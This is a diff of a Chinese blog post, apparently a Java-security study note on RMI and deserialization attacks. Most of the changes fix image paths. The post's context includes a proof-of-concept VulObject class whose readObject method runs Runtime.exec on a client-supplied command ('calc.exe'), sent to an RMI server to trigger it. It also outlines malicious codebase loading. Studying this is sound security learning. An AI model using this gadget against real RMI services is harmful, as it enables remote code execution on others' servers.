@@ -453,24 +453,24 @@
 <li>Java程序远程调用另一台服务器的java对象。</li>
 <li>RMI依赖的通信协议 JRMP。</li>
 </ul>
-<h3 id="RMI实现流程"><a href="#RMI实现流程" class="headerlink" title="RMI实现流程"></a>RMI实现流程</h3><p><img src="4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img"></p>
+<h3 id="RMI实现流程"><a href="#RMI实现流程" class="headerlink" title="RMI实现流程"></a>RMI实现流程</h3><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img"></p>
 <h4 id="1-创建接口"><a href="#1-创建接口" class="headerlink" title="1.创建接口"></a>1.创建接口</h4><p>在创建对象类之前，我们首先需要创建一个空接口，接口需要继承<code>java.rmi.Remote</code>。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204205736.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205736.png" alt></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public<span class="built_in"> interface </span>Services extends java.rmi.Remote &#123;</span><br><span class="line">    Object sendMessage(Message msg) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="2-实现接口"><a href="#2-实现接口" class="headerlink" title="2.实现接口"></a>2.实现接口</h4><p>接着我们实现这个接口，创建服务端对象类，实现的类必须继承UnicastRmeoteObject。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204205829.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205829.png" alt></p>
 <figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.<span class="type">RemoteException</span>;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.<span class="type">UnicastRemoteObject</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ServicesImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="title">implements</span> <span class="title">Services</span> </span>&#123;</span><br><span class="line">    public <span class="type">ServicesImpl</span>() <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public <span class="type">Object</span> sendMessage(<span class="type">Message</span> msg) <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="3-创建服务端-amp-amp-注册中心"><a href="#3-创建服务端-amp-amp-注册中心" class="headerlink" title="3.创建服务端&amp;&amp;注册中心"></a>3.创建服务端&amp;&amp;注册中心</h4><p>创建一个RMI服务端，服务端和客户端需要有共同的接口。然后创建注册中心，启动 <code>RMI</code> 的注册服务。<strong>server端将实例化的服务端远程对象绑定到registry</strong></p>
 <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.AlreadyBoundException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.RemoteException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.LocateRegistry;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.Registry;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">            ServicesImpl obj = <span class="keyword">new</span> ServicesImpl();</span><br><span class="line">            Registry registry = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 创建Registry</span></span><br><span class="line">                registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">                System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Using existing registry"</span>);</span><br><span class="line">                registry = LocateRegistry.getRegistry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绑定远程对象到Registry</span></span><br><span class="line">            registry.bind(<span class="string">"Services"</span>, obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204205801.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205801.png" alt></p>
 <p><strong>注意:</strong>低版本的JDK中，server服务端和register注册中心可以不在一台服务器上，高版本则只能在一台服务器上。</p>
 <h4 id="4-创建客户端"><a href="#4-创建客户端" class="headerlink" title="4.创建客户端"></a>4.创建客户端</h4><p>客户端与server和registry交互。</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package me.mole.javarmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 获取远程对象的引用</span></span><br><span class="line">        Services services = (Services) registry.lookup(<span class="string">"Services"</span>);</span><br><span class="line">        VulObject malicious = <span class="keyword">new</span> VulObject();</span><br><span class="line">        malicious.setParam(<span class="string">"calc.exe"</span>);</span><br><span class="line">        malicious.setMessage(<span class="string">"hacked by m01e"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用远程对象的引用调用对应的方法</span></span><br><span class="line">        System.out.<span class="built_in">println</span>(services.sendMessage(malicious));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204205817.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205817.png" alt></p>
 <p>我们在客户端这里创建一个恶意的命令执行的类VulObject。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulObject</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7398165783113471324L</span>;</span><br><span class="line">    <span class="keyword">private</span> String param;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParam</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.param = param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -480,14 +480,14 @@
 <li>远程获取:LocateRegistry#getRegistry</li>
 </ul>
 <p>无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的RegistryImpl对象进行调用。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204152056.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204152056.png" alt></p>
 <p>我们这里分析下调用 <code>LocateRegistry</code> 类的 <code>getRegistry</code> 方法。</p>
 <p>调用通过<code>getRegistry</code> 方法得到的<code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204144136.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204144136.png" alt></p>
 <p>这里首先通过<strong>newCall</strong>方法调用 TCPChannel 类的 createConnection 方法创建 socket 连接和注册服务通信。</p>
 <p>然后通过<strong>writeObject</strong>方法先后写入bind方法序列化的参数值。</p>
 <p>然后通过调用serviceCall 方法，获取到dispatcher，最后调用registry.RegistryImpl_Skel类的dispatch方法。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204200612.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204200612.png" alt></p>
 <p>var3是传递过来的int类型的参数，在这里有如下关系的对应：</p>
 <ul>
 <li>0-&gt;bind</li>
@@ -498,7 +498,7 @@
 </ul>
 <p>​     根据参数来决定服务端与客户端调用的方法。这个过程中基于序列化和反序列化来进行通讯的。那么我们就可以寻找反序列化的点来进行攻击。</p>
 <h4 id="调用rmi执行反序列化攻击"><a href="#调用rmi执行反序列化攻击" class="headerlink" title="调用rmi执行反序列化攻击"></a>调用rmi执行反序列化攻击</h4><p>首先启动注册服务，然后执行服务端，最后执行客户端。可以发现客户端能够成功调用服务端上的方法，实现远程方法调用。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204210147.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204210147.png" alt></p>
 <h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ul>
 <li>服务端Clockmpl()继承Clock()创建对象。</li>
 <li>服务端CLock()注册远程对象</li>
@@ -511,9 +511,9 @@
 <li>存根返回给客户端。</li>
 </ul>
 <h5 id="P牛对注册中心的解释"><a href="#P牛对注册中心的解释" class="headerlink" title="P牛对注册中心的解释"></a>P牛对注册中心的解释</h5><p>​    RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调用。</p>
-<h4 id="插一张先知的流程图"><a href="#插一张先知的流程图" class="headerlink" title="插一张先知的流程图"></a>插一张先知的流程图</h4><p><img src="007S8ZIlly1gfz5kokqvgj30fe0if407.jpg" alt="img"></p>
+<h4 id="插一张先知的流程图"><a href="#插一张先知的流程图" class="headerlink" title="插一张先知的流程图"></a>插一张先知的流程图</h4><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/007S8ZIlly1gfz5kokqvgj30fe0if407.jpg" alt="img"></p>
 <h3 id="RMI攻击手法"><a href="#RMI攻击手法" class="headerlink" title="RMI攻击手法"></a>RMI攻击手法</h3><p>先知社区上的一些总结，上图:</p>
-<p><img src="20200701101308-6810e0aa-bb40-1.png" alt="img"></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/20200701101308-6810e0aa-bb40-1.png" alt="img"></p>
 <p><strong>大致可以分为以下四类:</strong></p>
 <ul>
 <li><p>探测利用开放的RMI服务。</p>
@@ -551,15 +551,15 @@
 <ul>
 <li>服务端创建远程对象，<code>RMI Registry</code>启动并完成名称绑定，并设置<code>java.rmi.server.codebase</code>。</li>
 </ul>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204220949.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204220949.png" alt></p>
 <ul>
 <li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>，并根据服务器返回的<code>java.rmi.server.codebase</code>远程加载动态所需的类。</li>
 </ul>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204221009.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221009.png" alt></p>
 <h5 id="服务端动态加载"><a href="#服务端动态加载" class="headerlink" title="服务端动态加载"></a>服务端动态加载</h5><p>恶意的客户端代码：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210209010010.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210209010010.png" alt></p>
 <p>受害服务端代码：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20210204221040.png" alt=""></p>
+<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221040.png" alt></p>
 <h4 id="结合JNDI注入"><a href="#结合JNDI注入" class="headerlink" title="结合JNDI注入"></a>结合JNDI注入</h4><p>放到后面再细说。。(学晕了)</p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p>
 <p><a href="https://xz.aliyun.com/t/8644" target="_blank" rel="noopener">https://xz.aliyun.com/t/8644</a></p>
@@ -596,8 +596,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/" rel="next" title="java代码审计之常见漏洞学习">
-                <i class="fa fa-chevron-left"></i> java代码审计之常见漏洞学习
+              <a href="/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/" rel="next" title="SRC混子的漏洞挖掘之道">
+                <i class="fa fa-chevron-left"></i> SRC混子的漏洞挖掘之道
               </a>
             
           </div>
@@ -689,7 +689,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
